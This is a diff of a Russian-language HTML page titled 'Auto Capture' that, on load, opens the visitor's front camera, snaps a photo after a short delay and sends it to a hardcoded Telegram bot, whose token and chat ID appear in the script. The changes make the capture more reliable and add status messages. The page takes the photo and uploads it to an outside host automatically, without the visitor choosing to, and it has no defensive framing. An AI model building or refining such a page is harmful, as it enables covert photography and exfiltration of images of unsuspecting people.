@@ -4,44 +4,129 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Capture</title>
+    <style>
+        .container {
+            text-align: center;
+            margin: 20px auto;
+            max-width: 500px;
+        }
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+        #photo {
+            max-width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        .status {
+            margin-top: 10px;
+            color: #666;
+            font-style: italic;
+        }
+    </style>
 </head>
 <body>
-    <h2>Захваченное изображение:</h2>
-    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <img id="photo" alt="Фото будет здесь" style="max-width: 100%; display: none;">
+    <div class="container">
+        <h2>Захваченное изображение:</h2>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        <div class="status" id="status">Инициализация камеры...</div>
+        <img id="photo" alt="Фото будет здесь" style="display: none;">
+    </div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
         const photoElement = document.getElementById('photo');
-
+        const statusElement = document.getElementById('status');
+        
         const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Замени на новый токен
         const CHAT_ID = "7717007781"; // Твой chat_id
+        
+        let stream = null;
 
         // Запрашиваем доступ к камере
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // "user" — фронтальная камера
-            .then(stream => {
+        async function initCamera() {
+            try {
+                statusElement.textContent = "Запрос доступа к камере...";
+                
+                // Запрашиваем доступ к камере с более точными настройками
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user", // Фронтальная камера
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
                 video.srcObject = stream;
-                return new Promise(resolve => setTimeout(resolve, 2000)); // Даем камере загрузиться
-            })
-            .then(() => {
-                capturePhoto(); // Делаем фото после загрузки
-            })
-            .catch(error => console.error("Ошибка доступа к камере:", error));
+                
+                // Ждем, пока видео действительно начнет проигрываться
+                video.onloadedmetadata = function() {
+                    video.play();
+                    statusElement.textContent = "Камера инициализирована, подготовка к снимку...";
+                    
+                    // Даем камере время на автофокус и настройку экспозиции
+                    setTimeout(() => {
+                        statusElement.textContent = "Делаем снимок...";
+                        capturePhoto();
+                    }, 3000); // Увеличили время до 3 секунд
+                };
+            } catch (error) {
+                statusElement.textContent = "Ошибка: " + error.message;
+                console.error("Ошибка доступа к камере:", error);
+            }
+        }
 
         function capturePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            video.srcObject.getTracks().forEach(track => track.stop()); // Останавливаем камеру
-
-            canvas.toBlob(blob => {
-                displayPhoto(blob);
-                sendPhoto(blob);
-            }, 'image/jpeg');
+            try {
+                // Убедимся, что у нас есть размеры видео
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    statusElement.textContent = "Ошибка: Видеопоток не инициализирован";
+                    return;
+                }
+                
+                // Устанавливаем размеры холста в соответствии с размерами видео
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Получаем контекст для рисования
+                const ctx = canvas.getContext('2d');
+                
+                // Чистим холст (на всякий случай)
+                ctx.fillStyle = '#FFF';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Рисуем текущий кадр видео на холсте
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Останавливаем все треки потока (камеру)
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                
+                // Преобразуем содержимое холста в Blob
+                canvas.toBlob(
+                    blob => {
+                        if (blob) {
+                            displayPhoto(blob);
+                            sendPhoto(blob);
+                            statusElement.textContent = "Снимок сделан и отправляется...";
+                        } else {
+                            statusElement.textContent = "Ошибка создания изображения";
+                        }
+                    }, 
+                    'image/jpeg', 
+                    0.95  // Высокое качество JPEG
+                );
+            } catch (error) {
+                statusElement.textContent = "Ошибка при захвате фото: " + error.message;
+                console.error("Ошибка при захвате фото:", error);
+            }
         }
 
         function displayPhoto(blob) {
@@ -61,9 +146,20 @@
                 body: formData
             })
             .then(response => response.json())
-            .then(data => console.log("Отправлено:", data))
-            .catch(error => console.error("Ошибка отправки:", error));
+            .then(data => {
+                console.log("Отправлено:", data);
+                statusElement.textContent = data.ok ? 
+                    "Фото успешно отправлено в Telegram!" : 
+                    "Ошибка при отправке: " + (data.description || "неизвестная ошибка");
+            })
+            .catch(error => {
+                console.error("Ошибка отправки:", error);
+                statusElement.textContent = "Ошибка отправки: " + error.message;
+            });
         }
+
+        // Запускаем инициализацию камеры
+        initCamera();
     </script>
 </body>
 </html>
